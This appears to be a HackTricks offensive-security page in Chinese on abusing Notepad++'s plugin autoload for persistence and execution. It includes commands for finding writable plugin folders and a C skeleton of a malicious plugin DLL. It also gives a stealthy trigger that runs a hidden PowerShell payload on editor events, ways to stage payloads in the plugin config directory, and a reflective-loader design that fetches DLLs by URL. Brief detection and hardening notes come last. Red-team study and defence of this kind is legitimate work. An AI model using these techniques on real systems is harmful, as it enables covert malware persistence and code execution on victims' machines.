# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ 会在启动时**自动加载其 `plugins` 子文件夹下找到的每个插件 DLL**。将恶意插件放入任何**可写的 Notepad++ 安装目录**，即可在每次编辑器启动时于 `notepad++.exe` 进程内执行代码，可用于**持久化**、隐蔽的**初始执行**，或在编辑器以提升权限启动时充当**进程内加载器**。<sup>[[1]](#references)</sup>

自 **Notepad++ 7.6+** 起，预期的手动安装布局是**每个插件使用一个子文件夹**（`plugins\<PluginName>\<PluginName>.dll`）。在 **portable mode** 下（`notepad++.exe` 旁存在 `doLocalConf.xml`），整个应用程序目录树都会保留在该目录中，这通常会使复制的/admin 工具包变成易于利用的用户可写执行面。<sup>[[2]](#references)</sup>

## 可写的插件位置

- 标准安装：`C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`（通常需要 admin 权限才能写入）。<sup>[[1]](#references)</sup>
- 低权限 operator 的可写选项：<sup>[[1]](#references)</sup>
- 在用户可写文件夹中使用 **portable Notepad++ build**。
- 将 `C:\Program Files\Notepad++` 复制到用户控制的路径（例如 `%LOCALAPPDATA%\npp\`），然后从该路径运行 `notepad++.exe`。
- 查找已经包含 `doLocalConf.xml` 且位于 `Program Files` 之外的 **admin 工具包**、解压后的 zip 副本或 help-desk 工具包。
- 每个插件在 `plugins` 下都有自己的子文件夹，并会在启动时自动加载；菜单项会显示在 **Plugins** 下。<sup>[[2]](#references)</sup>

快速 triage：
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## 插件加载点（execution primitives）
Notepad++ 需要特定的 **exported functions**。这些函数都会在初始化期间被调用，从而提供多个 execution surfaces：<sup>[[1]](#references)</sup>
- **`DllMain`** — 在 DLL 加载时立即运行（第一个 execution point）。
- **`setInfo(NppData)`** — 加载时调用一次，用于提供 Notepad++ handles；通常用于注册菜单项。
- **`getName()`** — 返回菜单中显示的插件名称。
- **`getFuncsArray(int *nbF)`** — 返回菜单命令；即使为空，也会在启动期间调用。
- **`beNotified(SCNotification*)`** — 接收 Notepad++ / Scintilla 事件（可用于将 payloads 延迟到用户操作或编辑器事件发生时执行）。
- **`messageProc(UINT, WPARAM, LPARAM)`** — 消息处理程序，适用于较大的数据交换。
- **`isUnicode()`** — 加载时检查的兼容性标志。

大多数 exports 都可以实现为 **stubs**；在 autoload 期间，可以从 `DllMain` 或上述任意 callback 中执行。

## 最小 malicious plugin skeleton
使用预期的 exports 编译 DLL，并将其放置在可写的 Notepad++ 文件夹下的 `plugins\\MyNewPlugin\\MyNewPlugin.dll`：<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. 构建 DLL（Visual Studio/MinGW）。
2. 在 `plugins` 下创建 plugin 子文件夹，并将 DLL 放入其中。
3. 重启 Notepad++；DLL 会自动加载，执行 `DllMain` 及后续 callbacks。

## 通过 `beNotified` 实现低噪声触发模式
出于 OPSEC 考虑，许多 payloads 不应从 `DllMain` 触发。更隐蔽的模式是让 plugin 正常加载，然后仅在真实的 editor 事件发生后执行，例如 **启动完成**、**buffer 激活**或**首次输入字符**。
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
这比嘈杂的 `DllMain` beacon 更符合公开的 offensive research：DLL 仍会在启动时自动加载，但恶意操作会延迟到 Notepad++ 真正被使用时才执行。

## 将 plugin config directory 作为 secondary storage
Notepad++ 提供了 `NPPM_GETPLUGINSCONFIGDIR`，该接口返回**当前用户的 plugin configuration directory**。<sup>[[3]](#references)</sup> 恶意 plugin 可以利用此目录，让磁盘上的 DLL 保持精简，同时将加密配置、staged payload 或 tasking 文件存储在一个与正常 plugin 状态相融合的路径中。
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally this is useful when you want:
- 一个 tiny autoloaded bootstrap DLL；
- 在不再修改主 plugin binary 的情况下执行 per-user tasking；
- 将 **autoload trigger** 与更重的 second stage 分离。

## Reflective loader plugin pattern
一个 weaponized plugin 可以将 Notepad++ 转变为 **reflective DLL loader**：<sup>[[1]](#references)</sup>
- 提供一个 minimal UI/menu entry（例如 "LoadDLL"）。
- 接受用于获取 payload DLL 的 **file path** 或 **URL**。
- 将 DLL reflectively map 到当前进程中，并调用一个 exported entry point（例如获取的 DLL 内部的 loader function）。
- 优点：复用一个看似 benign 的 GUI process，而不是启动新的 loader；payload 继承 `notepad++.exe` 的 integrity level（包括 elevated contexts）。
- 权衡：将一个 **unsigned plugin DLL** 写入磁盘会产生明显痕迹；一种 practical variation 是仅将 autoloaded plugin 用作 stub，并将真正的 implant 加密后存放或 staged 到其他位置。

## Detection and hardening notes
- 阻止或监控 **writes to Notepad++ plugin directories**（包括 user profiles 中的 portable copies）；启用 controlled folder access 或 application allowlisting。
- 对 `plugins` 下的 **new unsigned DLLs**、portable Notepad++ trees 的变更，以及来自 `notepad++.exe` 的异常 **child processes/network activity** 触发告警。
- 建立 legitimate plugins 的 baseline，并调查任何导出正常 Notepad++ plugin interface、但同时会启动 shells、PowerShell 或 network beacons 的新 DLL。
- 强制仅通过 **Plugins Admin** 安装 plugin，并限制从 untrusted paths 执行 portable copies。

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
